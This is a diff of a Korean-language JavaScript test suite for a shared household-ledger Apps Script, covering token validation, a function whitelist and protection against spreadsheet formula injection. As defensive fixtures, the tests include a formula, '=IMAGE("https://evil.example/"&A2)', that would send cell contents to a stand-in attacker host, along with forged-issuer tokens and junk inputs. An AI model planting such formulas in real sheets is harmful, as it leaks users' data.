@@ -703,9 +703,9 @@ function withClientId() {
 
 test('초대받은 사람은 증명서로 들어올 수 있다', () => {
   const gas = withClientId();
-  gas.issueToken('good', { email: 지민 });
+  const good = gas.issueToken('good', { email: 지민 });
 
-  const out = gas.post({ token: 'good', fn: 'getBootstrap', args: [''] });
+  const out = gas.post({ token: good, fn: 'getBootstrap', args: [''] });
   assert.equal(out.error, undefined, out.error);
   assert.equal(out.result.me.email, 지민);
 });
@@ -717,43 +717,43 @@ test('증명서가 없거나 가짜면 막는다', () => {
   assert.match(none.error, /로그인이 필요합니다/);
   assert.equal(none.needSignIn, true);
 
-  const fake = gas.post({ token: '아무거나', fn: 'getBootstrap', args: [''] });
+  const fake = gas.post({ token: 'head.YWJj.sign', fn: 'getBootstrap', args: [''] });
   assert.match(fake.error, /만료/);
 });
 
 test('남의 사이트에서 발급된 증명서는 막는다', () => {
   const gas = withClientId();
   // 이메일은 진짜지만, 다른 곳에서 받은 증명서
-  gas.issueToken('stolen', { email: 지민, aud: 'someone-else.apps.googleusercontent.com' });
+  const stolen = gas.issueToken('stolen', { email: 지민, aud: 'someone-else.apps.googleusercontent.com' });
 
-  const out = gas.post({ token: 'stolen', fn: 'getBootstrap', args: [''] });
+  const out = gas.post({ token: stolen, fn: 'getBootstrap', args: [''] });
   assert.match(out.error, /다른 곳에서 발급된/);
 });
 
 test('만료된 증명서는 막는다', () => {
   const gas = withClientId();
-  gas.issueToken('old', { email: 지민, expiresInSec: -60 });
+  const old = gas.issueToken('old', { email: 지민, expiresInSec: -60 });
 
-  const out = gas.post({ token: 'old', fn: 'getBootstrap', args: [''] });
+  const out = gas.post({ token: old, fn: 'getBootstrap', args: [''] });
   assert.match(out.error, /만료/);
   assert.equal(out.needSignIn, true);
 });
 
 test('초대받지 않은 계정은 막는다', () => {
   const gas = withClientId();
-  gas.issueToken('outsider', { email: 'stranger@example.com' });
+  const outsider = gas.issueToken('outsider', { email: 'stranger@example.com' });
 
-  const out = gas.post({ token: 'outsider', fn: 'getBootstrap', args: [''] });
+  const out = gas.post({ token: outsider, fn: 'getBootstrap', args: [''] });
   assert.match(out.error, /초대되지 않은/);
   assert.equal(out.needSignIn, true);
 });
 
 test('목록에 없는 함수는 부를 수 없다', () => {
   const gas = withClientId();
-  gas.issueToken('good', { email: 지민 });
+  const good = gas.issueToken('good', { email: 지민 });
 
   for (const fn of ['ensureSheets_', 'readSettings_', 'doPost', '']) {
-    const out = gas.post({ token: 'good', fn, args: [] });
+    const out = gas.post({ token: good, fn, args: [] });
     assert.match(out.error, /알 수 없는 요청/, `${fn} 이(가) 막히지 않았습니다`);
   }
 });
@@ -761,10 +761,10 @@ test('목록에 없는 함수는 부를 수 없다', () => {
 test('누가 넣었는지는 증명서의 주인으로 기록된다', () => {
   const gas = withClientId();
   // 스크립트는 주인(지민)으로 실행되지만, 요청한 사람은 수호다
-  gas.issueToken('suho', { email: 수호 });
+  const suho = gas.issueToken('suho', { email: 수호 });
 
   const out = gas.post({
-    token: 'suho',
+    token: suho,
     fn: 'addTransaction',
     args: [{ date: '2026-08-10', kind: 'expense', amount: 7000, category: '식비', month: '2026-08' }],
   });
@@ -842,4 +842,85 @@ test('말이 안 되는 종료일은 막는다', () => {
     assert.throws(() => gas.call('updateSettings', { endDay: bad, month: '2026-08' }),
       /종료일/, `${bad} 이(가) 통과했습니다`);
   }
+});
+
+/* ================================================================== */
+/* 보안                                                                */
+/* ================================================================== */
+
+test('증명서 모양이 아니면 구글에 묻지도 않는다', () => {
+  const gas = withClientId();
+  const before = gas.asked();
+
+  // 구글에 묻는 횟수에는 하루 한도가 있다. 아무 글자나 계속 보내는 것만으로
+  // 그 한도를 태워 우리 둘까지 못 쓰게 만들 수 있다.
+  for (const junk of ['아무거나', 'a.b', '....', 'x'.repeat(5000), '<script>', '']) {
+    const out = gas.post({ token: junk, fn: 'getBootstrap', args: [''] });
+    assert.ok(out.error, `${junk.slice(0, 12)} 이(가) 통과했습니다`);
+  }
+  assert.equal(gas.asked(), before, '모양만 봐도 될 것을 구글에 물었습니다');
+});
+
+test('한 번 가짜로 판명된 증명서는 다시 묻지 않는다', () => {
+  const gas = withClientId();
+  const fake = 'head.ZmFrZQ.sign';
+
+  gas.post({ token: fake, fn: 'getBootstrap', args: [''] });
+  const after첫번 = gas.asked();
+  gas.post({ token: fake, fn: 'getBootstrap', args: [''] });
+
+  assert.equal(gas.asked(), after첫번, '같은 가짜를 두 번 물었습니다');
+});
+
+test('구글이 아닌 곳에서 발급된 증명서는 막는다', () => {
+  const gas = withClientId();
+  const evil = gas.issueToken('evil', { email: 지민, iss: 'https://evil.example' });
+
+  const out = gas.post({ token: evil, fn: 'getBootstrap', args: [''] });
+  assert.match(out.error, /구글이 발급한 증명서가 아닙니다/);
+});
+
+test('명단에 없는 사람을 작성자로 지정할 수 없다', () => {
+  const gas = withClientId();
+  const token = gas.issueToken('t', { email: 지민 });
+  const add = (userEmail) => gas.post({
+    token,
+    fn: 'addTransaction',
+    args: [{ date: '2026-08-10', kind: 'expense', amount: 1000, category: '식비', userEmail, month: '2026-08' }],
+  });
+
+  assert.match(add('stranger@example.com').error, /함께 쓰는 사람만/);
+  assert.equal(add(수호).error, undefined, '같이 쓰는 사람은 되어야 합니다');
+  assert.equal(add('').error, undefined, '비우면 접속한 사람이 되어야 합니다');
+});
+
+test('메모가 시트에서 수식으로 실행되지 않는다', () => {
+  const gas = freshLedger();
+
+  // =IMAGE("https://…"&A2) 같은 걸 적어두면, 나중에 시트를 열었을 때 옆 칸 내용이
+  // 바깥으로 새어 나갈 수 있다. 글자로만 남아야 한다.
+  const 위험한것 = ['=IMAGE("https://evil.example/"&A2)', '+1+1', '-1-1', '@SUM(A1)'];
+  위험한것.forEach((memo, i) => {
+    gas.call('addTransaction', {
+      date: '2026-08-0' + (i + 1), kind: 'expense', amount: 1000, category: '식비', memo, month: '2026-08',
+    });
+  });
+
+  gas.dump('내역').slice(1).forEach((row) => {
+    const cell = String(row[5]);
+    assert.equal(cell[0], "'", `시트에 수식으로 들어갔습니다: ${cell}`);
+  });
+
+  // 화면에는 따옴표 없이 원래대로 보여야 한다
+  const memos = gas.call('getMonthData', '2026-08').transactions.map((t) => t.memo);
+  위험한것.forEach((m) => assert.ok(memos.includes("'" + m) || memos.includes(m), m + ' 이(가) 사라졌습니다'));
+});
+
+test('카테고리 이름도 수식으로 들어가지 않는다', () => {
+  const gas = freshLedger();
+  gas.call('addGroup', { kind: 'expense', name: '=SUM(A1:A9)', color: '#ff0000' });
+
+  const 대분류 = gas.dump('대분류').slice(1).map((r) => String(r[2]));
+  assert.ok(대분류.includes("'=SUM(A1:A9)"), '이름이 글자로 저장되지 않았습니다: ' + 대분류.join(', '));
+  assert.equal(대분류.filter((n) => n[0] === '=').length, 0, '수식으로 들어간 이름이 있습니다');
 });
